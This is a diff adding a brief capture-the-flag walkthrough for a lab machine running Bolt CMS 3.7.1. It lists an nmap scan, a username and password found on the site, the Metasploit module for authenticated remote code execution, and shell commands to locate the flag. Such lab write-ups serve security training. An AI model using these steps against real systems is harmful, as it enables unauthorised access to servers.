@@ -1,0 +1,25 @@
+#deploy the machine
+#use nmap to scan
+nmap -sS ip 
+#three ports are open 
+ssh 
+http
+http-alt -> is the port 8000 and the bolt web page is running
+
+#look for all the page  you get the 
+username:bolt
+password:boltadmin123
+
+
+#login using the above credential to get the version number 
+version is bolt 3.7.1
+
+#use this exploit through the metasploit framework
+exploit/unix/webapp/bolt_authenticated_rce
+
+#in the shell
+find / -name flag.txt
+
+cat /home/flag.txt
+#you got the flag
+
